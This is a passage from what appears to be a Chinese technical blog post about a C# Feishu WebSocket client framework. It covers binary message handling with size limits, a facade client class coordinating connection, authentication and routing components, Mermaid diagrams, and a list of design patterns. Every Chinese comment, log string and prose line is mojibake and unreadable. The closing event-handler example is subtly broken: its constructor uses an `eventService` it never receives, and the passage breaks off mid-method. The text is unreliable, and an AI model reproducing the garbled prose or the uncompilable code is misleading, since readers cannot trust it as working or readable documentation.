                <span class="hljs-comment">// æ£€æŸ¥æ•°æ®å¤§å°é™åˆ¶</span>
                <span class="hljs-keyword">if</span> (_binaryDataStream.Length &gt; _options.MaxBinaryMessageSize)
                {
                    <span class="hljs-keyword">var</span> errorMessage = <span class="hljs-string">$"äºŒè¿›åˆ¶æ¶ˆæ¯å¤§å°è¶…è¿‡é™åˆ¶ (<span class="hljs-subst">{_binaryDataStream.Length}</span> &gt; <span class="hljs-subst">{_options.MaxBinaryMessageSize}</span>)"</span>;
                    _logger.LogError(errorMessage);
                    
                    <span class="hljs-comment">// æ¸…ç†å½“å‰æ•°æ®æµ</span>
                    _binaryDataStream.Dispose();
                    _binaryDataStream = <span class="hljs-literal">null</span>;
                    
                    <span class="hljs-comment">// è§¦å‘é”™è¯¯äº‹ä»¶</span>
                    OnError(errorMessage, <span class="hljs-string">"MessageSizeExceeded"</span>);
                    <span class="hljs-keyword">return</span>;
                }
                
                <span class="hljs-comment">// å¦‚æœæ¶ˆæ¯æ¥æ”¶å®Œæˆ</span>
                <span class="hljs-keyword">if</span> (endOfMessage)
                {
                    <span class="hljs-keyword">var</span> completeData = _binaryDataStream.ToArray();
                    <span class="hljs-keyword">var</span> receiveDuration = DateTime.UtcNow - _binaryDataReceiveStartTime;
                    
                    <span class="hljs-keyword">if</span> (_options.EnableLogging)
                        _logger.LogInformation(<span class="hljs-string">"äºŒè¿›åˆ¶æ¶ˆæ¯æ¥æ”¶å®Œæˆï¼Œå¤§å°: {Size} å­—èŠ‚ï¼Œè€—æ—¶: {Duration}ms"</span>,
                            completeData.Length, receiveDuration.TotalMilliseconds);
                    
                    <span class="hljs-comment">// å¼‚æ­¥å¤„ç†å®Œæ•´çš„äºŒè¿›åˆ¶æ¶ˆæ¯</span>
                    _ = Task.Run(<span class="hljs-keyword">async</span> () =&gt;
                    {
                        <span class="hljs-keyword">await</span> ProcessCompleteBinaryMessageAsync(completeData, cancellationToken);
                    }, cancellationToken);
                    
                    <span class="hljs-comment">// æ¸…ç†èµ„æº</span>
                    _binaryDataStream.Dispose();
                    _binaryDataStream = <span class="hljs-literal">null</span>;
                }
                <span class="hljs-keyword">else</span>
                {
                    <span class="hljs-keyword">if</span> (_options.EnableLogging)
                        _logger.LogDebug(<span class="hljs-string">"å·²æ¥æ”¶äºŒè¿›åˆ¶æ¶ˆæ¯ç‰‡æ®µï¼Œå½“å‰æ€»å¤§å°: {Size} å­—èŠ‚"</span>, 
                            _binaryDataStream.Length);
                }
            }
        }
        <span class="hljs-keyword">catch</span> (Exception ex)
        {
            <span class="hljs-comment">// å‘ç”Ÿå¼‚å¸¸æ—¶æ¸…ç†èµ„æº</span>
            <span class="hljs-keyword">lock</span> (_binaryDataStreamLock)
            {
                _binaryDataStream?.Dispose();
                _binaryDataStream = <span class="hljs-literal">null</span>;
            }
            
            <span class="hljs-keyword">if</span> (_options.EnableLogging)
                _logger.LogError(ex, <span class="hljs-string">"å¤„ç†äºŒè¿›åˆ¶æ¶ˆæ¯æ—¶å‘ç”Ÿé”™è¯¯"</span>);
            OnError(<span class="hljs-string">$"å¤„ç†äºŒè¿›åˆ¶æ¶ˆæ¯æ—¶å‘ç”Ÿé”™è¯¯: <span class="hljs-subst">{ex.Message}</span>"</span>, ex.GetType().Name);
        }
    }
}
</code></pre>
<p><strong>æ ¸å¿ƒç‰¹æ€§</strong></p>
<ul>
<li>ğŸ“¦ <strong>æµå¼å¤„ç†</strong>ï¼šæ”¯æŒå¤§æ¶ˆæ¯åˆ†ç‰‡æ¥æ”¶</li>
<li>ğŸ”„ <strong>åŒæ ¼å¼æ”¯æŒ</strong>ï¼šProtoBufä¼˜å…ˆï¼ŒJSONå›é€€</li>
<li>ğŸ“Š <strong>å¤§å°é™åˆ¶</strong>ï¼šå¯é…ç½®çš„æ¶ˆæ¯å¤§å°é™åˆ¶</li>
<li>ğŸ¯ <strong>è‡ªåŠ¨è·¯ç”±</strong>ï¼šè§£æåè‡ªåŠ¨è·¯ç”±åˆ°æ¶ˆæ¯å¤„ç†å™¨</li>
</ul>
<p><strong>å¤„ç†æµç¨‹</strong></p>
<ol>
<li><strong>å¢é‡æ¥æ”¶</strong>ï¼šåˆ†ç‰‡æ¥æ”¶äºŒè¿›åˆ¶æ•°æ®ï¼Œå†™å…¥å†…å­˜æµ</li>
<li><strong>å¤§å°æ£€æŸ¥</strong>ï¼šå®æ—¶ç›‘æ§æ•°æ®å¤§å°ï¼Œé˜²æ­¢å†…å­˜æº¢å‡º</li>
<li><strong>æ ¼å¼è§£æ</strong>ï¼šProtoBufååºåˆ—åŒ–ï¼Œå¤±è´¥åˆ™å›é€€åˆ°JSON</li>
<li><strong>æ¶ˆæ¯è·¯ç”±</strong>ï¼šæå–JSON Payloadï¼Œè·¯ç”±åˆ°å¯¹åº”å¤„ç†å™¨</li>
<li><strong>ACKç¡®è®¤</strong>ï¼šå‘æœåŠ¡å™¨å‘é€å¤„ç†ç¡®è®¤</li>
</ol>
<h3 data-id="heading-12">ä¸»å®¢æˆ·ç«¯é›†æˆï¼ˆFeishuWebSocketClientï¼‰</h3>
<p>FeishuWebSocketClientæ˜¯æ•´ä¸ªæ¡†æ¶çš„é—¨é¢ç»„ä»¶ï¼Œè´Ÿè´£åè°ƒå’Œç¼–æ’å„ä¸ªå­ç»„ä»¶çš„å·¥ä½œã€‚å®ƒé‡‡ç”¨ç»„ä»¶åŒ–è®¾è®¡æ¨¡å¼ï¼Œå°†å¤æ‚çš„WebSocketè¿æ¥ç®¡ç†åŠŸèƒ½åˆ†è§£ä¸ºç‹¬ç«‹çš„ã€å¯å¤ç”¨çš„ç»„ä»¶ï¼Œå¹¶é€šè¿‡ç»Ÿä¸€çš„äº‹ä»¶ç³»ç»Ÿè¿›è¡Œé›†æˆã€‚</p>
<p><strong>å®¢æˆ·ç«¯æ¶æ„é›†æˆ</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[FeishuWebSocketClient] --&gt; B[WebSocketConnectionManager]
    A --&gt; C[AuthenticationManager]
    A --&gt; D[MessageRouter]
    A --&gt; E[BinaryMessageProcessor]
    A --&gt; F[EventHandlerFactory]
    
    B --&gt; G[è¿æ¥ç®¡ç†&lt;br/&gt;å»ºç«‹/æ–­å¼€/é‡è¿]
    C --&gt; H[è®¤è¯ç®¡ç†&lt;br/&gt;è®¤è¯/çŠ¶æ€/é‡è¯•]
    D --&gt; I[æ¶ˆæ¯è·¯ç”±&lt;br/&gt;åˆ†å‘/å¤„ç†/è·¯ç”±]
    E --&gt; J[äºŒè¿›åˆ¶å¤„ç†&lt;br/&gt;è§£æ/ç»„è£…/ACK]
    F --&gt; K[äº‹ä»¶å¤„ç†&lt;br/&gt;æ³¨å†Œ/åˆ†å‘/å›è°ƒ]
    
    A --&gt; L[äº‹ä»¶ç³»ç»Ÿ]
    L --&gt; M[Connected]
    L --&gt; N[Disconnected]
    L --&gt; O[Authenticated]
    L --&gt; P[MessageReceived]
    L --&gt; Q[Error]
    L --&gt; R[BinaryMessageReceived]
    
    S[æ¶ˆæ¯é˜Ÿåˆ—] --&gt; A
    T[å¿ƒè·³ç›‘æ§] --&gt; A
    U[é…ç½®ç®¡ç†] --&gt; A
    
    style A fill:#e1f5fe
    style B fill:#fff3e0
    style C fill:#f3e5f5
    style D fill:#e8f5e8
    style E fill:#fce4ec
</code></pre>
<p><strong>ç»„ä»¶åè°ƒä¸ç¼–æ’</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> é£ä¹¦WebSocketå®¢æˆ·ç«¯ - é‡‡ç”¨ç»„ä»¶åŒ–è®¾è®¡æé«˜å¯ç»´æŠ¤æ€§</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title">FeishuWebSocketClient</span> : <span class="hljs-title">IFeishuWebSocketClient</span>, <span class="hljs-title">IDisposable</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> ILogger&lt;FeishuWebSocketClient&gt; _logger;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> FeishuWebSocketOptions _options;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> IFeishuEventHandlerFactory _eventHandlerFactory;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> WebSocketConnectionManager _connectionManager;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> AuthenticationManager _authManager;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> MessageRouter _messageRouter;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> BinaryMessageProcessor _binaryProcessor;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> ConcurrentQueue&lt;<span class="hljs-built_in">string</span>&gt; _messageQueue = <span class="hljs-keyword">new</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> List&lt;Func&lt;<span class="hljs-built_in">string</span>, Task&gt;&gt; _messageProcessors = <span class="hljs-keyword">new</span>();
    <span class="hljs-keyword">private</span> Task? _messageProcessingTask;
    <span class="hljs-keyword">private</span> ILoggerFactory _loggerFactory;
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">bool</span> _disposed = <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> CancellationTokenSource? _cancellationTokenSource;

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> WebSocketState State =&gt; _connectionManager.State;
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">bool</span> IsAuthenticated =&gt; _authManager.IsAuthenticated;

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;EventArgs&gt;? Connected;
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketCloseEventArgs&gt;? Disconnected;
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketMessageEventArgs&gt;? MessageReceived;
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketErrorEventArgs&gt;? Error;
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;EventArgs&gt;? Authenticated;
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketPingEventArgs&gt;? PingReceived;
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketPongEventArgs&gt;? PongReceived;
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketHeartbeatEventArgs&gt;? HeartbeatReceived;
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketFeishuEventArgs&gt;? FeishuEventReceived;
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;inheritdoc/&gt;</span></span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketBinaryMessageEventArgs&gt;? BinaryMessageReceived;

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> é»˜è®¤æ„é€ å‡½æ•°</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">FeishuWebSocketClient</span>(<span class="hljs-params">
        ILogger&lt;FeishuWebSocketClient&gt; logger,
        IFeishuEventHandlerFactory eventHandlerFactory,
        ILoggerFactory loggerFactory,
        FeishuWebSocketOptions? options = <span class="hljs-literal">null</span></span>)</span>
    {
        _logger = logger ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(logger));
        _eventHandlerFactory = eventHandlerFactory ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(eventHandlerFactory));
        _options = options ?? <span class="hljs-keyword">new</span> FeishuWebSocketOptions();
        _loggerFactory = loggerFactory;
        
        <span class="hljs-comment">// åˆå§‹åŒ–ç»„ä»¶</span>
        _connectionManager = <span class="hljs-keyword">new</span> WebSocketConnectionManager(_loggerFactory.CreateLogger&lt;WebSocketConnectionManager&gt;(), _options);
        _authManager = <span class="hljs-keyword">new</span> AuthenticationManager(_loggerFactory.CreateLogger&lt;AuthenticationManager&gt;(), _options, (message) =&gt; SendMessageAsync(message));
        _messageRouter = <span class="hljs-keyword">new</span> MessageRouter(_loggerFactory.CreateLogger&lt;MessageRouter&gt;(), _options);
        _binaryProcessor = <span class="hljs-keyword">new</span> BinaryMessageProcessor(_loggerFactory.CreateLogger&lt;BinaryMessageProcessor&gt;(), _connectionManager, _options, _messageRouter);

        <span class="hljs-comment">// è®¢é˜…ç»„ä»¶äº‹ä»¶</span>
        SubscribeToComponentEvents();

        <span class="hljs-comment">// æ³¨å†Œæ¶ˆæ¯å¤„ç†å™¨</span>
        RegisterMessageHandlers();
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> è®¢é˜…ç»„ä»¶äº‹ä»¶</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SubscribeToComponentEvents</span>()</span>
    {
        <span class="hljs-comment">// è¿æ¥ç®¡ç†å™¨äº‹ä»¶</span>
        _connectionManager.Connected += (s, e) =&gt; Connected?.Invoke(<span class="hljs-keyword">this</span>, e);
        _connectionManager.Disconnected += (s, e) =&gt; Disconnected?.Invoke(<span class="hljs-keyword">this</span>, e);
        _connectionManager.Error += (s, e) =&gt; Error?.Invoke(<span class="hljs-keyword">this</span>, e);

        <span class="hljs-comment">// è®¤è¯ç®¡ç†å™¨äº‹ä»¶</span>
        _authManager.Authenticated += (s, e) =&gt; Authenticated?.Invoke(<span class="hljs-keyword">this</span>, e);
        _authManager.AuthenticationFailed += (s, e) =&gt; Error?.Invoke(<span class="hljs-keyword">this</span>, e);

        <span class="hljs-comment">// äºŒè¿›åˆ¶å¤„ç†å™¨äº‹ä»¶</span>
        _binaryProcessor.BinaryMessageReceived += (s, e) =&gt; BinaryMessageReceived?.Invoke(<span class="hljs-keyword">this</span>, e);
        _binaryProcessor.Error += (s, e) =&gt; Error?.Invoke(<span class="hljs-keyword">this</span>, e);
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ³¨å†Œæ¶ˆæ¯å¤„ç†å™¨</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">RegisterMessageHandlers</span>()</span>
    {
        <span class="hljs-keyword">var</span> pingPongHandler = <span class="hljs-keyword">new</span> PingPongMessageHandler(
            _loggerFactory.CreateLogger&lt;PingPongMessageHandler&gt;(),
            _options,
            (message) =&gt; SendMessageAsync(message));

        <span class="hljs-keyword">var</span> authHandler = <span class="hljs-keyword">new</span> AuthMessageHandler(
            _loggerFactory.CreateLogger&lt;AuthMessageHandler&gt;(),
            (success) =&gt;
            {
                <span class="hljs-keyword">if</span> (success)
                {
                    _authManager.HandleAuthResponse(<span class="hljs-string">"{\"code\":0,\"msg\":\"Authentication successful\"}"</span>);
                }
                <span class="hljs-keyword">else</span>
                {
                    _authManager.HandleAuthResponse(<span class="hljs-string">"{\"code\":-1,\"msg\":\"Authentication failed\"}"</span>);
                }
            });

        <span class="hljs-keyword">var</span> heartbeatHandler = <span class="hljs-keyword">new</span> HeartbeatMessageHandler(_loggerFactory.CreateLogger&lt;HeartbeatMessageHandler&gt;(), _options);

        _messageRouter.RegisterHandler(pingPongHandler);
        _messageRouter.RegisterHandler(authHandler);
        _messageRouter.RegisterHandler(heartbeatHandler);
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å»ºç«‹WebSocketè¿æ¥</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">ConnectAsync</span>(<span class="hljs-params">WsEndpointResult endpoint, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">if</span> (endpoint == <span class="hljs-literal">null</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(endpoint));

        <span class="hljs-keyword">await</span> _connectionManager.ConnectAsync(endpoint.Url, cancellationToken);

        <span class="hljs-comment">// å¯åŠ¨æ¶ˆæ¯æ¥æ”¶</span>
        _cancellationTokenSource = <span class="hljs-keyword">new</span> CancellationTokenSource();
        _ = Task.Run(() =&gt; StartReceivingAsyncInternal(_cancellationTokenSource.Token), _cancellationTokenSource.Token);

        <span class="hljs-comment">// å¯åŠ¨å¿ƒè·³</span>
        _ = Task.Run(() =&gt; StartHeartbeatAsync(_cancellationTokenSource.Token), _cancellationTokenSource.Token);

        <span class="hljs-comment">// å¯åŠ¨æ¶ˆæ¯é˜Ÿåˆ—å¤„ç†</span>
        <span class="hljs-keyword">if</span> (_options.EnableMessageQueue)
        {
            _messageProcessingTask = ProcessMessageQueueAsync(_cancellationTokenSource.Token);
        }
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å»ºç«‹WebSocketè¿æ¥å¹¶è¿›è¡Œè®¤è¯</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">ConnectAsync</span>(<span class="hljs-params">WsEndpointResult endpoint, <span class="hljs-built_in">string</span> appAccessToken, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">await</span> ConnectAsync(endpoint, cancellationToken);
        <span class="hljs-keyword">await</span> _authManager.AuthenticateAsync(appAccessToken, cancellationToken);
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ–­å¼€WebSocketè¿æ¥</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">DisconnectAsync</span>(<span class="hljs-params">CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        _cancellationTokenSource?.Cancel();
        <span class="hljs-keyword">await</span> _connectionManager.DisconnectAsync(cancellationToken);
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å‘é€æ¶ˆæ¯</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">SendMessageAsync</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">await</span> _connectionManager.SendMessageAsync(message, cancellationToken);
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ³¨å†Œæ¶ˆæ¯å¤„ç†å™¨</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">RegisterMessageProcessor</span>(<span class="hljs-params">Func&lt;<span class="hljs-built_in">string</span>, Task&gt; processor</span>)</span>
    {
        <span class="hljs-keyword">if</span> (processor == <span class="hljs-literal">null</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(processor));

        _messageProcessors.Add(processor);
    }
}
</code></pre>
<p><strong>å®¢æˆ·ç«¯ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">stateDiagram-v2
    [*] --&gt; Disconnected: åˆå§‹åŒ–
    Disconnected --&gt; Connecting: ConnectAsync
    Connecting --&gt; Connected: è¿æ¥æˆåŠŸ
    Connecting --&gt; AuthenticationFailed: è¿æ¥å¤±è´¥
    Connected --&gt; Authenticating: è®¤è¯æµç¨‹
    Authenticating --&gt; Authenticated: è®¤è¯æˆåŠŸ
    Authenticating --&gt; AuthenticationFailed: è®¤è¯å¤±è´¥
    Authenticated --&gt; Active: å¯åŠ¨åå°ä»»åŠ¡
    Active --&gt; Disconnecting: DisconnectAsync
    AuthenticationFailed --&gt; Disconnecting: æ¸…ç†èµ„æº
    Disconnecting --&gt; Disconnected: æ–­å¼€å®Œæˆ
    Active --&gt; Reconnecting: è¿æ¥å¼‚å¸¸
    Reconnecting --&gt; Connecting: é‡è¿å°è¯•
    
    note right of Connecting
        å»ºç«‹WebSocketè¿æ¥
        åˆå§‹åŒ–ç»„ä»¶çŠ¶æ€
        å¯åŠ¨äº‹ä»¶è®¢é˜…
    end note
    
    note right of Authenticating
        å‘é€è®¤è¯æ¶ˆæ¯
        ç­‰å¾…è®¤è¯å“åº”
        æ›´æ–°è®¤è¯çŠ¶æ€
    end note
    
    note right of Active
        æ¶ˆæ¯æ¥æ”¶å¤„ç†
        å¿ƒè·³ç›‘æ§
        æ¶ˆæ¯é˜Ÿåˆ—å¤„ç†
    end note
</code></pre>
<p><strong>ç»„ä»¶åä½œæ—¶åºå›¾</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant Client as FeishuWebSocketClient
    participant ConnManager as ConnectionManager
    participant AuthManager as AuthenticationManager
    participant MsgRouter as MessageRouter
    participant BinProcessor as BinaryProcessor
    participant App as åº”ç”¨ç¨‹åº
    
    App-&gt;&gt;Client: ConnectAsync(endpoint, token)
    Client-&gt;&gt;ConnManager: ConnectAsync(url)
    ConnManager--&gt;&gt;Client: è¿æ¥æˆåŠŸäº‹ä»¶
    
    Client-&gt;&gt;Client: å¯åŠ¨æ¶ˆæ¯æ¥æ”¶
    Client-&gt;&gt;Client: å¯åŠ¨å¿ƒè·³
    Client-&gt;&gt;Client: å¯åŠ¨æ¶ˆæ¯é˜Ÿåˆ—
    
    Client-&gt;&gt;AuthManager: AuthenticateAsync(token)
    AuthManager-&gt;&gt;ConnManager: SendMessageAsync(authæ¶ˆæ¯)
    AuthManager--&gt;&gt;Client: è®¤è¯æˆåŠŸäº‹ä»¶
    
    Note over Client: æ¶ˆæ¯æ¥æ”¶å¤„ç†å¾ªç¯
    loop æ¶ˆæ¯æ¥æ”¶
        ConnManager-&gt;&gt;Client: æ¥æ”¶WebSocketæ¶ˆæ¯
        
        alt æ–‡æœ¬æ¶ˆæ¯
            Client-&gt;&gt;MsgRouter: RouteMessageAsync(message)
            MsgRouter-&gt;&gt;MsgRouter: æŸ¥æ‰¾å¤„ç†å™¨
            MsgRouter-&gt;&gt;MsgRouter: å¤„ç†æ¶ˆæ¯
            MsgRouter--&gt;&gt;Client: å¤„ç†å®Œæˆ
        else äºŒè¿›åˆ¶æ¶ˆæ¯
            Client-&gt;&gt;BinProcessor: ProcessBinaryDataAsync(data)
            BinProcessor-&gt;&gt;BinProcessor: è§£æProtoBuf
            BinProcessor-&gt;&gt;MsgRouter: RouteBinaryMessageAsync(json)
            BinProcessor--&gt;&gt;Client: BinaryMessageReceivedäº‹ä»¶
        end
        
        Client-&gt;&gt;App: è§¦å‘ç›¸åº”äº‹ä»¶
    end
    
    App-&gt;&gt;Client: DisconnectAsync()
    Client-&gt;&gt;ConnManager: DisconnectAsync()
    Client-&gt;&gt;Client: å–æ¶ˆåå°ä»»åŠ¡
    Client--&gt;&gt;App: æ–­å¼€å®Œæˆ
</code></pre>
<p><strong>æ ¸å¿ƒè®¾è®¡æ¨¡å¼</strong></p>
<ol>
<li>
<p><strong>é—¨é¢æ¨¡å¼ï¼ˆFacade Patternï¼‰</strong>ï¼š</p>
<ul>
<li>FeishuWebSocketClientä½œä¸ºç»Ÿä¸€å…¥å£</li>
<li>éšè—å†…éƒ¨ç»„ä»¶å¤æ‚æ€§</li>
<li>æä¾›ç®€æ´çš„APIæ¥å£</li>
</ul>
</li>
<li>
<p><strong>è§‚å¯Ÿè€…æ¨¡å¼ï¼ˆObserver Patternï¼‰</strong>ï¼š</p>
<ul>
<li>äº‹ä»¶é©±åŠ¨çš„ç»„ä»¶é€šä¿¡</li>
<li>æ¾è€¦åˆçš„ç»„ä»¶åä½œ</li>
<li>æ”¯æŒå¤šè®¢é˜…è€…ç›‘å¬</li>
</ul>
</li>
<li>
<p><strong>ç­–ç•¥æ¨¡å¼ï¼ˆStrategy Patternï¼‰</strong>ï¼š</p>
<ul>
<li>å¯æ’æ‹”çš„æ¶ˆæ¯å¤„ç†å™¨</li>
<li>çµæ´»çš„è·¯ç”±ç­–ç•¥</li>
<li>åŠ¨æ€å¤„ç†å™¨æ³¨å†Œ</li>
</ul>
</li>
<li>
<p><strong>å·¥å‚æ¨¡å¼ï¼ˆFactory Patternï¼‰</strong>ï¼š</p>
<ul>
<li>EventHandlerFactoryåˆ›å»ºå¤„ç†å™¨</li>
<li>ç»Ÿä¸€çš„ç»„ä»¶åˆå§‹åŒ–</li>
<li>ä¾èµ–æ³¨å…¥æ”¯æŒ</li>
</ul>
</li>
</ol>
<h2 data-id="heading-13">å››ã€åº”ç”¨ç¤ºä¾‹</h2>
<h3 data-id="heading-14">4.1 äº‹ä»¶å¤„ç†å™¨å®ç°</h3>
<p><strong>ç”¨æˆ·åˆ›å»ºäº‹ä»¶å¤„ç†å™¨ç¤ºä¾‹</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> æ¼”ç¤ºç”¨æˆ·äº‹ä»¶å¤„ç†å™¨ - ç»§æ‰¿é¢„å®šä¹‰çš„ç”¨æˆ·åˆ›å»ºäº‹ä»¶å¤„ç†å™¨</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">DemoUserEventHandler</span> : <span class="hljs-title">DefaultFeishuEventHandler</span>&lt;<span class="hljs-title">UserCreatedResult</span>&gt;
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> DemoEventService _eventService;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> INotificationService _notificationService;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">DemoUserEventHandler</span>(<span class="hljs-params">
        ILogger&lt;DemoUserEventHandler&gt; logger,
        INotificationService notificationService</span>) : <span class="hljs-title">base</span>(<span class="hljs-params">logger</span>)</span>
    {
        _eventService = eventService ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(eventService));
